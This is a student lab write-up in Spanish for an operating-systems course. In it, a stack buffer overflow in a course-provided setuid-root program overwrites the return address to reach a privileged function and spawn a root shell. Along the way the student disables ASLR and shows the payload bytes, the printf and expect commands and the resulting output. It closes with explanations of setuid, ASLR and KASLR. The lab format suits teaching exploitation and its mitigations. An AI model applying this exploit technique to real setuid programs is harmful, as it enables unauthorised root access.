# Buffer Overflow reemplazando dirección de retorno

## Ejercicio 1: Compilar usando el makefile provisto el ejemplo 01-stack-overflow-ret.c provisto en el repositorio de la cátedra.

- Ya esta hecho en el ejercicio 1 del módulo anterior

## Ejercicio 2: Configurar setuid en el programa para que al ejecutarlo, se ejecute como usuario root.

- El Makefile ya lo hizo (pidió la contraseña de root e hizo `chown root` + `chmod u+s`)
- podemos verificarlo con `ls -l 01-stack-overflow-ret` 
  - Tenemos que ver, dueño root, y una S en los permisos del owner

## Ejercicio 3: Verificar si tiene ASLR activado en el sistema. Si no está, actívelo.

1. lo verificamos con `cat /proc/sys/kernel/randomize_va_space`
2. si no está activado lo activamos con `su -c "echo 2 > /proc/sys/kernel/randomize_va_space"`

## Ejercicio 4: Tenemos los siguientes datos sobre el stack:

- a. El stack crece hacia abajo.
- b. Si estamos compilando en x86_64 los punteros ocupan 8 bytes.
- c. x86_64 es little endian.
- d. Primero se apiló la dirección de retorno (una dirección dentro de la función `main()`). Ocupa 8 bytes.
- e. Luego se apiló la vieja base de la pila (`rbp`). Ocupa 8 bytes.
- f. Luego se apila `debug` que ocupa 1 byte pero puede tener bytes de relleno (verificar en el archivo .s la cantidad de padding que se agrega entre `debug` y `password`).
- g. `password` ocupa 16 bytes.

#### Calcule cuántos bytes de relleno necesita para pisar primero `debug` y luego la dirección de retorno.

- **Para pisar debug**: 31 bytes de relleno + 1 byte <> 0 (según el `.s`, `debug` está en `rbp-1`, no en el offset que sugería el diagrama del comentario).
- **Para pisar la dirección de retorno**: 40 bytes de relleno + 8 bytes con la dirección de `privileged_fn()`

## Ejercicio 5: Ejecute 01-stack-overflow-ret al menos 2 veces pisando el valor de `debug` para verificar que la dirección de memoria de `privileged_fn()` cambia.


- Para pisar debug y activar la impresión de la dirección de privileged_fn(), se necesitan 32 caracteres (31 de relleno hasta debug, ubicado en rbp-1 según el .s, + 1 byte ≠ 0 que lo pisa):
- `python3 -c "print('A'*32)" | ./01-stack-overflow-ret`

```bash
so@so:~/codigo-para-practicas/practica5/overflow$ python3 -c "print('A'*32)" | ./01-stack-overflow-ret
Write password: privileged_fn: 0x55dc322f71c9
Wrong password. Access denied.
Return address on stack: 0x55dc322f737e
Access denied
Violación de segmento
so@so:~/codigo-para-practicas/practica5/overflow$ python3 -c "print('A'*32)" | ./01-stack-overflow-ret
Write password: privileged_fn: 0x564c3b97e1c9
Wrong password. Access denied.
Return address on stack: 0x564c3b97e37e
Access denied
Violación de segmento
```

La dirección de `privileged_fn()` cambia entre una ejecución y otra. Esto se debe a que ASLR está activado: el binario es PIE (Position Independent Executable), por lo que en cada ejecución el kernel carga el ejecutable en una dirección base aleatoria, y las direcciones de sus funciones cambian en consecuencia. Por eso un atacante no puede conocer de antemano la dirección de `privileged_fn()` a la que redirigir la ejecución.

## Ejercicio 6: Apague ASLR y repita el punto 3 para verificar que esta vez el proceso siempre retorna la misma dirección de memoria para `privileged_fn()`.

1. `su -c "echo 0 > /proc/sys/kernel/randomize_va_space"`
2. Ejecutamos de nuevo
    ```bash
    so@so:~/codigo-para-practicas/practica5/overflow$ python3 -c "print('A'*32)" | ./01-stack-overflow-ret
    Write password: privileged_fn: 0x5555555551c9
    Wrong password. Access denied.
    Return address on stack: 0x55555555537e
    Access denied
    Violación de segmento
    so@so:~/codigo-para-practicas/practica5/overflow$ python3 -c "print('A'*32)" | ./01-stack-overflow-ret
    Write password: privileged_fn: 0x5555555551c9
    Wrong password. Access denied.
    Return address on stack: 0x55555555537e
    Access denied
    Violación de segmento
    ```
Ahora la dirección `privileged_fn()` es exactamente la misma en todas las corridas. Al desactivar ASLR, el ejecutable se carga siempre en la misma dirección base, así que las funciones quedan en direcciones fijas y predecibles.

## Ejercicio 7: Ejecute el script `generate_payload.py` para generar el payload.

```bash
so@so:~/codigo-para-practicas/practica5/overflow$ ./generate_payload.py 
Loop mode: enter payload parameters repeatedly.
buffer size: 16
padding size: 24
address (blank to reuse previous, X to exit): 0x5555555551c9
Payload: AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB\xc9QUUUU\x00\x00
Previous values: buffer=16, padding=24, address=0x5555555551c9
```

- `AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB\xc9QUUUU\x00\x00` es el payload para pisar la dirección de retorno de `login()`

## Ejercicio 8: Pruebe el payload redirigiendo la salida del script a 01-stack-overflow-ret usando un pipe.

```bash
so@so:~/codigo-para-practicas/practica5/overflow$ printf 'AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB\xc9\x51\x55\x55\x55\x55\x00\x00' | ./01-stack-overflow-ret
Write password: privileged_fn: 0x5555555551c9
Wrong password. Access denied.
Return address on stack: 0x5555555551c9
uid = 1000, euid = 0
You are now root
```

## Ejercicio 9: Para poder interactuar con el shell modifique `exploit.expect` para que envíe el payload correcto y ejecute ese archivo con el comando `expect`.

- `nano exploit.expect`
- agregamos nuestro payload, en mi caso `send "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB\xc9\x51\x55\x55\x55\x55\x00\x00\r"`
- `expect exploit.expect`
  ```bash
    so@so:~/codigo-para-practicas/practica5/overflow$ expect exploit.expect
    spawn ./01-stack-overflow-ret
    Write password: AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBÉQUUUU^@^@
    privileged_fn: 0x5555555551c9
    Wrong password. Access denied.
    Return address on stack: 0x5555555551c9
    uid = 1000, euid = 0
    You are now root
    # 
  ```

## Ejercicio 10: Pruebe algunos comandos para verificar que realmente tiene acceso a un shell con UID 0.

```
# id
uid=0(root) gid=1000(so) grupos=1000(so),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
# whoami
root
```

## Ejercicio 11: Conteste:

### a. ¿Qué efecto tiene setear el bit setuid en un programa si el propietario del archivo es `root`? ¿Qué efecto tiene si el usuario es por ejemplo `nobody`?

El bit setuid hace que el programa se ejecute con los privilegios del dueño del archivo, no del usuario que lo lanza. 
- En el caso de que el propietario sea el `root`. Cualquier usuario que ejecute el programa corre con euid = 0 (root). Por eso nuestro exploit funcionó, al saltar a `privileged_fn()`, el `setuid(0)` tuvo éxito y obtuvimos un shell root. Es muy peligroso.
- En el caso de que el propietario sea `nobody`. El programa corre con los privilegios de `nobody`, un usuario sin ningún privilegio (pensado justamente para procesos no confiables). Si explotáramos el mismo overflow, el `setuid(0)` fallaría (`nobody` no puede hacerse `root`) y a lo sumo obtendríamos un shell como nobody, sin ganancia real de privilegios.

### b. ¿Cómo ASLR ayuda a evitar este tipo de ataques en un escenario real donde el programa no imprime en pantalla el puntero de la función objetivo?


Con ASLR activado, la dirección base del ejecutable (y por ende de `privileged_fn`) es distinta y aleatoria en cada ejecución. El atacante no puede hardcodear la dirección en el payload, porque no la conoce y cambia cada vez. Si adivina mal, el return salta a una dirección inválida y el programa crashea en vez de ejecutar la función objetivo. ASLR obliga al atacante a adivinar entre millones de direcciones posibles, o a encontrar primero una vulnerabilidad de fuga de información que le revele alguna dirección.

### c. ¿Cómo podría evitar este tipo de ataques en un módulo del kernel de Linux? ¿Qué mecanismo debería estar habilitado?

Con **KASLR (Kernel Address Space Layout Randomization)**: el equivalente de ASLR pero para el kernel. Aleatoriza la dirección base donde se carga el kernel (y sus módulos) en memoria al arrancar, de modo que las direcciones de funciones y estructuras del kernel no sean predecibles. Así, un atacante que explote un overflow en un módulo no puede saber a qué dirección saltar.
- Se complementa con otras mitigaciones del kernel:
  - Stack canaries (`CONFIG_STACKPROTECTOR`) para detectar el desborde.
  - SMEP/SMAP (impiden que el kernel ejecute/lea memoria de espacio de usuario).
  - `CONFIG_RANDOMIZE_BASE` es la opción de compilación que habilita KASLR.


